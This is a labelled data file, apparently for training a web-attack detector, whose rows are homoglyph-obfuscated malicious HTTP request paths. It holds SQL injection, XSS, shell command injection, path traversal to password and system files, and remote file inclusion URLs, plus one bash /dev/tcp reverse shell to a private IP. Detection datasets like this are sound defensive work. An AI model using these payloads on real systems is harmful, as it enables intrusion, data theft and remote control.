sentences 	 labels
/ 𝗌𝗍ring / strings / parameters = \  "  >  <  / script >  < script  > alert ( 0x000123 )  <  / script >  	 1
/ ℮𝒹zaia0i . asp ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𐑈𝓉ring / strings / parameters = echo $ ifsvpyeig $  (  ( 0 + 32 )  )  $  ( echo $ ifsvpyeig ) vpyeig |  	 1
/ j𝔞𝘷ascript / program files . exe  	 1
/ 𝓅𝘩pmyadmin / language . php ? data_dir =  / etc / passwd \ x00  	 1
/ 𝑒𝘅amples / jsp / checkbox / classes / adodbt / sql . php ? classes_dir =  / etc / passwd \ x00  	 1
/ mo𝕕ʋles / forums / bb_smilies . php ? name =  < script > alert (  ' vulnerable '  )  <  / script >  	 1
/ m𝚊𝒾n . php ? frm_daynight = day & frm_passwd =  & frm_referer = http :  /  / 192 . 168 . 26 . 202 / main . php ? logout = 1 & frm_user =  & scr_height = q39895688 & scr_width =  	 1
/ o𝗿𝐝er / login . php ? svr_rootscript = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ 𝘴𝔱ring / modo = registro & login = fleurima & password = sa924a9u25 & nombre = ladislada & apellidos = aregall + picabea & email = ursitti @ nightflight . dm & dni = 88865484q & direccion = merced ,  + 63 +  & ciudad = valdemierque & cp = 08784 & provincia = s / alaman + c . a & ntc = 5240985649337180 & b1 = registrar  	 1
/ 𝓼𝗍ring / strings / parameters = ;  str =  $  ( echo nmeesi )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  "  	 1
/ mаn𝘢ger / mrtg . cgi ? cfg =  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ 𝓼𝘵ring / strings / parameters = 1 %  '  )  )  or 8384 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  '  %  '  =  '  	 1
/ jαטascript /  . passwd . old  	 1
/ ƽ𝚝ring / strings / parameters = 1 where 2301 = 2301 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ 𐑈𝑡ring / strings / parameters = 1 '  )  )  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  (  ' qgov '  =  ' qgov  	 1
/ ଃх6w469u . php ?  < script > document . cookie =  " testgfjr = 1286 ;  "  <  / script >  	 1
/ 𝖘𝖙ring / strings / parameters = |   [  5 -ne  $  ( echo sqhkcg  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ 𝐞𝘅amples / servlets / servlet / home / search . asp ? nchannel =  ' 1  	 1
/ 𝕥l𝗁hwkvs . exe /  	 1
/ zln𝟐𝘩m2z . cfc ?  < script > document . cookie =  " testblcp = 8120 ;  "  <  / script >  	 1
/ o𝗉𝖾nsiteadmin / scripts / classes / fieldmanager . php ? path = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ?  \ x00  	 1
/ 𑣁𝘵ring / strings / parameters = '  |  | echo $ ifsvwmbcl $  (  ( 58 + 34 )  )  $  ( echo $ ifsvwmbcl ) vwmbcl \  	 1
/ oԁzk𝟐9aa . x ?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >  	 1
/ 𝙨𝓉ring / strings / parameters = &  & echo hopiin $  (  ( 13 + 15 )  )  $  ( echo hopiin ) hopiin '  	 1
/ 𝗲ⅹamples / jsp / security / protected / j_security_check ; jsessionid = 5680ad1b9956cf0a8a9f08a20f983ee61712365427 . copy  	 1
/ 𝓼𝖙ring / strings / parameters = 1 '  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  ' yhpp '  like  ' yhpp  	 1
/ 𝒔𝙩ring / strings / parameters = '  ;  str =  $  ( echo ooyllh )  ;  str1 =  $  {  # str }  ;  if  [  4 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 1
/ р𝓇ojects / 1 / repository / annotate ? rev =  ` 0 <  & 186- ; exec 186 <  >  / dev / tcp / 192 . 168 . 202 . 118 / 17246 ; sh  <  & 186  >  & 186 2 >  & 186 `  	 1
/ ƽ𝓽ring / id = 3 & nombre = queso + manchego & precio = 39 /  & cantidad = 90 & b1 = aadir + al + carrito  	 1
/ 𝗲𑣖rx3ya4 . idc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝘴𝗍ring / strings / parameters = '  | echo $ ifsqjceho $  (  ( 0 + 51 )  )  $  ( echo $ ifsqjceho ) qjceho /  /  	 1
/ 𝓈𝓉ring / strings / parameters = "  + if ( benchmark ( 3000000 , md5 ( 1 )  )  , null , null )  , null , null , null )   /  *  	 1
/ 𑣆𝕦1pb2xi . dll ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  	 1
/ 𝗌𝐭ring / strings / parameters = < script >  ( 0 )  [  ' constructor '  ]  [  ' constructor '  ]  (  "  \ 141 \ 154 \ 145 \ 162 \ 164 ( 1 )  "  )  (  )  ;  <  / script >  	 1
/ ꜱ𝗍ring / modo = registro & login = steene & password = h3millos6 & nombre = monserrat & apellidos = barber & email = nachum @ enmenorca . com . ma & dni = 50805644r & direccion = calle + dueas ,  + 60 ,  +  & ciudad = medrano @ 40 & cp = 22439 & provincia = zaragoza & ntc = 6147677145944254 & b1 = registrar  	 1
/ 𝑖nꓒex . php /  \  "  >  < script >  < script > alert ( document . cookie )  <  / script >  <  	 1
/ 𝚜𝟽qus4g3 . htm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𝑠𝓽ring / strings / parameters = 1 %  "  "  )  )  )  and 3202 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ 𝒷𑢻xdqgz2 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ 𐑈𝔱ring / strings / parameters = -3424 '  )  )  or 4144 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  ' dyuo '  =  ' dyuo  	 1
/ 𝖘𝖙ring / strings / parameters = & echo rcnyou $  (  ( 2 + 11 )  )  $  ( echo rcnyou ) rcnyou |  	 1
/ ꜱ𝗍ring / strings / parameters = ) print (  ` echo afomnk echo  $  (  ( 45 + 23 )  )  echo afomnk echo afomnk `  )  ;  )  } afomnk  	 1
/ 𝚜𝔱ring / strings / parameters = 1 or 2633 = dbms_pipe . receive_message ( chr ( 112 )  |  | chr ( 65 )  |  | chr ( 65 )  |  | chr ( 103 )  , 5 )  #  tsxs  	 1
/ 𝐬𝓽ring / strings / parameters = & lt ; a href =  \  " http &  # 58 ;  /  / www &  # 46 ; google &  # 46 ; com &  # 46 ;  /  \  "  & gt ; xss & lt ;  / a & gt ;  	 1
/ 𝓈𝖙ring / strings / parameters = echo bsyifx $  (  ( 64 + 71 )  )  $  ( echo bsyifx ) bsyifx /  /  	 1
/ 𝓼𝓉ring / strings / parameters = 1 "  "  )  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  (  "  " wvkp "  "  like  "  " wvkp  	 1
/ jα𝒗ascript / jpg . exe  	 1
/ 𝖋𝖕npp5zg . aspx ?  < meta http-equiv = set-cookie content =  " testyias = 101 "  >  	 1
/ n𝙮j𝘨aorz . cfc ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝓉𝓊kodz3j . do ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝙨𝖙ring / strings / parameters = '  |   [  4 -ne  $  ( echo sbhmiy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ j𝖺ᴠascript / misc . exe  	 1
/ 𝘴𝓉ring / strings / parameters = '  ;  str =  $  ( echo ghehaj )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  |  	 1
/ 𝐬𝘵ring / modo = registro & login = felicity & password = bo9510c8951vo & nombre = deodato & apellidos = treig + bonitto & email = roo @ didacramirez . kn & dni = 42952758m & direccion = lora + 64 ,  +  & ciudad = villanueva + de + teba & cp = 0930a & provincia = valladolid & ntc = 8769540261854446 & b1 = registrar  	 1
/ ℮n-𝓾s / i686v90l . fts ?  < script > document . cookie =  " testfutf = 1550 ;  "  <  / script >  	 1
/ 𝐩Ꭵrvate / ltwpdfmonth . php ? ltw_config [  ' include_dir ]  = http :  /  / cirt . net / rfiinc . txt ?  	 1
/ j𝗮טascript / modify . exe  	 1
/ 𝐬𝘁ring / strings / parameters = 1 %  '  )  )  and elt ( 1210 = 1210 , sleep ( 5 )  )  and  (  (  '  %  '  =  '  	 1
/ 𝗌𝑡ring / strings / parameters = &  & echo slsodi $  (  ( 22 + 77 )  )  $  ( echo slsodi ) slsodi '  	 1
/  /  	 1
/ ỿ𝐛z5rz7a . x ?  < script > document . cookie =  " testsbvw = 6289 ;  "  <  / script >  	 1
/ 𝖘𝔱ring / strings / parameters = -5637 %  "  "  )  )  )  or 6872 = 6872 and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ 𑣁𝘵ring / strings / parameters = -3747 "  "  )  union all select 8962 , 8962 , 8962 , 8962 , 8962 #  	 1
/ 𐑈𝒕ring / strings / parameters = 1 %  "  "  )  )  )  ; select sleep ( 5 )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ 𝓈𝚝ring / strings / parameters = $  { exec ( print (  ` echo hiumzj `  .  ` echo  $  (  ( 69 + 37 )  )  `  .  ` echo hiumzj `  .  ` echo hiumzj `  )  ; hiumzj  	 1
/ 𝓻𝔞anw4ia . cfm ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝖘𝒄ripts / index . php ? option = frontpage & itemid = 2 | system ( id )  | 1331909360  	 1
/ 𝖌𝐯x7m5ti . cgi ?  < meta http-equiv = set-cookie content =  " testwldz = 3506 "  >  	 1
/ 𝚜сripts / phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332010390 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / boot . ini \ x00  	 1
/ 𝒔𝔱ring / strings / parameters = |   [  3 -ne  $  ( echo mgkxid  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ 𐑈𝘁ring / strings / parameters = 1 '  or updatexml ( 1808 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 1808 = 1808 , 1 )  )  )  , 0x717a767a71 )  , 8666 )  and  ' nhmz '  like  ' nhmz  	 1
/  < meta http-equiv = set-cookie content =  " testcmax = 9270 "  >  	 1
/ ꜱ𝗍ring / strings / parameters = "  &  & echo $ ifseqttbq $  (  ( 35 + 0 )  )  $  ( echo $ ifseqttbq ) eqttbq "  	 1
/ 𝗽𝓱pmyadmin /  .  .  / phpmyadmin . gz  	 1
/ ց𝘩swfouu . idc ?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >  	 1
/ j𝒂𝗏ascript / components . exe  	 1
/ 𝘱Ꮒpmyadmin / index . php ? x = browse & category =  ' union select  ' 1 '  ,  ' 2 '  ,  ' pixelpost_category_sql_injection . nasl '  ,  ' 1331904457 '  ,  ' 5 '  --  	 1
/ _m℮m_𝗯in / formslogin . asp ? url =  >  < script > alert (  ' vulnerable '  )  ;  <  / script >  	 1
/ հⅇlp . php ? q =  "  | ping ; -w ; 7000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ;  	 1
/ 𝕤𝓉ring / strings / parameters = 1 )  )  as pjjz where 8384 = 8384 and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  --  	 1
/ ϲ𝑤mail . exe  	 1
/ 𝒔𝘁ring / strings / parameters = 1 "  "  )  where 6897 = 6897 ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ 𝗑oo𝔭s232b / htdocs / xoops_lib / modules / protector / onupdate . php ? mydirname = a (  )  {  } system (  ' chmod + 777 +  / tmp / cullodfxkf . sh '  )  ;  function v  	 1
/ mαꭵn . php ? logout =  '  \ x0ddel \ x09q42114986 \ x09 #  	 1
/ 𝒔𝔱ring / strings / parameters = -7207 '  or 4747 = dbms_utility . sqlid_to_sqlhash (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  and  ' obxw '  =  ' obxw  	 1
/ ꜱ𝓉ring / strings / parameters = |  | echo dndmgp $  (  ( 12 + 45 )  )  $  ( echo dndmgp ) dndmgp |  	 1
/ 𝙚𝚡amples / jsp / jsp2 / el / pjreview_neo . cgi ? p =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ сl𝙖sses / performance . class . php ? rootdir = xxpathxx ?  	 1
/ jn𝘵𝈆f86c . idc ?  < meta http-equiv = set-cookie content =  " testcmax = 9270 "  >  	 1
/  .  .  /  /  .  .  /  /  .  .  /  /  .  .  /  /  .  .  /  /  { file }  	 1
/ ѕ𝑡ring / strings / parameters = &  # 000060 ;  	 1
/ 𝘀𝚝ring / strings / parameters = -4669 '  union all select 9387 , 9387 , 9387 , 9387 , 9387 , 9387 , 9387 , 9387 , 9387 , 9387 --  	 1
/ 𝘴𝔱ring / strings / parameters = )  ;  } print (  ` echo kyglof `  .  ` echo  $  (  ( 80 + 87 )  )  `  .  ` echo kyglof `  .  ` echo kyglof `  )  )  } kyglof  	 1
/  \  { file }  	 1
/ Ꮒ𝔢lp . php ? q =  "  | ping \ x0c-w \ x0c11000 \ x0c-n \ x0c1 \ x0c4 . 3 . 2 . 1 | rem \ x0c  	 1
/ 𝗌𝘵ring / strings / parameters = | echo cdhghw $  (  ( 46 + 6 )  )  $  ( echo cdhghw ) cdhghw "  	 1
/ 𑣁𝑡ring / strings / parameters = |   [  4 -ne  $  ( echo dlkwgt  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ 𝓈𝕥ring / modo = registro & login = klasky & password = tem . tico & nombre = licia & apellidos = maeso + comello & email = verrell . myral @ cafedeteatro . kh & dni = 33908887x & direccion = plaza + pedro + marcos ,  + 145 +  & ciudad = guadalupe & cp = 36700 & provincia = g + u * adalaj + ara & ntc = 4984450191632548 & b1 = registrar  	 1
/ 𑣁𝙩ring / strings / parameters = as injectx where 1 = 1 and 1 = 0 #  	 1
/ 𝚜𝕥ring / strings / parameters = "  ; echo $ ifsnoilcw $  (  ( 35 + 50 )  )  $  ( echo $ ifsnoilcw ) noilcw \  \  	 1
/ m𝖆𝕚n . php ? logout =  "  & uname \ x09 > q79499365 \ x09 #  	 1
/ 𝖊᙮amples / jsp / num / myevent . php ? myevent_path =  / etc / passwd \ x00  	 1
/ 𝘀𝔱ring / strings / parameters = 1 '  )  )  )  or 7552 =  ( select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 )  and  (  (  (  ' bfrq '  like  ' bfrq  	 1
/ 𝑠𝒕ring / strings / parameters = " onmousedown =  "  &  # 00097 ;  &  # 000108 ;  &  # 000101 ;  &  # 000114 ;  &  # 000116 ;  &  # 00040 ;  &  # 00039 ;  &  # 00088 ;  &  # 00083 ;  &  # 00083 ;  &  # 00039 ;  &  # 00041 ;  "  	 1
/ 𝚎𝐱amples / servlets / servlet / faxsurvey ? cat  / etc / passwd  	 1
/ 𝕤𝐭ring / strings / parameters = "  & echo $ ifswxtkdi $  (  ( 17 + 67 )  )  $  ( echo $ ifswxtkdi ) wxtkdi "  	 1
/ ꜱ𝘵ring / modo = registro & login = rockford & password = eng68nd13i8ient5 & nombre = saiguen & apellidos = gramunt + alzuria & email = berthels-dahlbeck @ muevemiweb . br & dni = 87238782n & direccion = calle + salvador + c * ru + ixent ,  +  + 115 +  & ciudad = cceres & cp = 06197 & provincia = valencia & ntc = 8495227312439801 & b1 = registrar  	 1
/ 𝓼𝘵ring / strings / parameters = 523 '  /  *  ! limit *  / 1 , 1 /  *  ! union *  /  /  *  ! all *  /  /  *  ! select *  /  /  *  ! concat *  /  ( 0x3a6a7a713a ,  /  *  ! ifnull *  /  ( cast (  /  *  ! database *  /  (  )  /  *  ! as *  /  /  *  ! char *  /  )  , 0x20 )  , 0x3a79757a3a )  #  	 1
/ 𝗌𝗍ring / strings / parameters = '  |   [  9 -ne  $  ( echo iqybmk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  |  	 1
/ ⅰn𝖼ludes / iplogger . php ? phpbb_root_path = xxpathxx ? ls  	 1
/ 𝓈𝓉ring / str =  $  ( echo netebt )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  	 1
/ 𝓈𝓉ring / modo = registro & login = wei & password = presen ,  /  , ciar & nombre = estefan & apellidos = tomasa + camino & email = bovell_haygarth @ nuestrasantacruz . vu & dni = 75996092k & direccion = guadiana + s / n + 2 ? c & ciudad = ossa + de + montiel & cp = 08470 & provincia = badajoz & ntc = 4288323841686638 & b1 = registrar  	 1
/ lm𝒘𝟒r201 . pl ?  < script > document . cookie =  " testwews = 8477 ;  "  <  / script >  	 1
/ 𝑐𝐠i-bin / loadpage . cgi ? user_id = 1 & file =  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \  .  .  \  \ winnt \  \ win . ini  	 1
/ 𝚜𝗍ring / modo =  ?  & login = natraj & pwd = desa1a0car & remember = on & b1 = entrar  	 1
/ 𝖘𝙘ripts / event_view . php ? eid = 34 union select 452593950  	 1
/ ℯ𝒙amples / jsp / jsp2 / jspx / activatemember ? activatecode =  & member =  "  >  < script > alert (  ' mvnforum_activatemember_xss . nasl '  )  <  / script >  	 1
/ 𑣁𝚝ring / strings / parameters = < meta http-equiv = set-cookie content =  " testrluj = 1420 "  >  	 1
/ ꜱ𝗍ring / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo ezdzjg )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  #  	 1
/ 𐓒o𝟧qp766 . pl ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝐬𝘵ring / modo = registro & login = schenck6 & password = otorgadera & nombre = balbino & apellidos = zapata + pine & email = falconetti @ normatic-vending . ar & dni = 77359416c & direccion = calle + lope + de + vega + 19 +  & ciudad = valle + de + losa & cpa = 02270 & provincia = valladolid & ntc = 2171024439369893 & b1 = registrar  	 1
/ j𝘢𑣀ascript /  . passwd . tgz  	 1
/ 𝓼𝘁ring / modo = registro & login = willison & passworda = a2ent9dora & nombre = adelen & apellidos = avell & email = slaughter-worde @ juegois . ac & dni = 93046182g & direccion = plza .  + de + la + concepcion ,  + 121 +  & ciudad = figueruelas & cp = 01220 & provincia = burgos & ntc = 6349941758199278 & b1 = registrar  	 1
/ 𐑈𝑡ring / strings / parameters = -5054 %  "  "  )  )  )  union all select 8263 , 8263 , 8263 , 8263 --  	 1
/ k𝓌𝖎noqez . exe /  	 1
/ 𝖘𝗍ring / modo = registro & login = chari & password = 7abu5u9o & nombre = martn & apellidos = dionisio + catalan '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = lenauer @ buscamoto . bg & dni = 11787764b & direccion = colonia + san + buenaventura ,  + s / n +  & ciudad = calicasas & cp = 50299 & provincia = zaragoza & ntc = 2683958622320827 & b1 = registrar  	 1
/ 𝘱𝖍pmyadmin /  /  .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c .  .  \ xc1 \ x9c / etc / passwd  	 1
/ 𝔰𝒕ring / strings / parameters = < bgsound src =  " javascript : confirm (  ' xss '  )  ;  "  >  	 1
/ 𝘀𝘵ring / strings / parameters = 1 "  "  )  where 9115 = 9115 ; select case when 8867 = 7630 then 1 else null end --  	 1
/ j𝟜𝗋dyhw8 . jsp ?  < meta http-equiv = set-cookie content =  " testrluj = 1420 "  >  	 1
/ 𝖘𝗍ring / strings / parameters = 1 '  )  )  as bwjl where 8538 = 8538 union all select null , null , null , null , null , null , null #  	 1
/ ѕ𝕥ring / errormsg =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' %  	 1
/ 𝖍𝔢lp . php ? q =  " ping ; -w ; 8000 ; -n ; 1 ; 4 . 3 . 2 . 1 | rem ;  	 1
/ 𐑈𝓽ring / strings / parameters = -5500 '  )  order by 1 --  	 1
/ 𑣁𝘁ring / modo = insertar & precio = 8083 & b1 = confirmarany set-cookie :  + tamper = 1041264011025374727  	 1
/ 𝔰𝕥ring / strings / parameters = -5292 '  )  union all select 1439 , 1439 , 1439 , 1439 #  	 1
/ ƽ𝔱ring / strings / parameters = '  & echo $ ifspgddip $  (  ( 30 + 43 )  )  $  ( echo $ ifspgddip ) pgddip &  	 1
/ j𝚞j𝗀xwav . cgi ?  < script > document . cookie =  " testknim = 9383 ;  "  <  / script >  	 1
/ j𝒶𝐯ascript /  . passwd . trace  	 1
/ ƽ𝓽ring / modo = insertar & precio = 853 & b1 =  '  + and +  ' 1 '  =  ' 1  	 1
/ 𑣁𝘵ring / strings / parameters = 1 %  '  and 6454 = 8348 and  '  %  '  =  '  	 1
/ еn-𝐮s / oie504mr . nsf ?  < script > document . cookie =  " testtpby = 7052 ;  "  <  / script >  	 1
/ 𝓇𝒂_bust ' em /  	 1
/ 𝓮ᶃaet53a . aspx ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ 𝓎𝒆f5f3d5 . html ?  < script > document . cookie =  " testcrcv = 6167 ;  "  <  / script >  	 1
/ 𝓈𝖙ring / strings / parameters = 1 '  |  |  ( select  ' sxya '  where 3578 = 3578 ; select  ( case when  ( 6276 = 6276 )  then 6276 else 6276 *  ( select 6276 from information_schema . character_sets )  end )  #  	 1
/ 𝖊n-ꞟs / oie504mr . jsp ?  < meta http-equiv = set-cookie content =  " testtpby = 7052 "  >  	 1
/ m𝓪𝒊n . php ? logout =  "  & ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0  	 1
/ ꬲ𝘅amples / jsp / num / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1369222205 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  	 1
/ 𝗁𝙩bin / query ? mss =  .  .  / config  	 1
/ 𝙨𝚝ring / strings / parameters = < script > 1 \ u0069 \ u006e [  ]  ;  <  / script >  	 1
/ 𝘀𝒄ripts / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ 𝘷𝈆axg1p8 . asp ?  < script > document . cookie =  " testxagh = 6987 ;  "  <  / script >  	 1
/ 𝐬𝑡ring / strings / parameters = 1 '  ,  ( select  ( case when  ( 1570 = 1570 )  then  ( select 1570 from pg_sleep ( 5 )  )  else 1 /  ( select 0 )  end )  )  	 1
/ 𝘦n-ꭎs / manager / search / data / inputs / script / _new ? action = edit  	 1
/ ꜱ𝔱ring / strings / parameters = |   / bin / sleep 31  ;  	 1
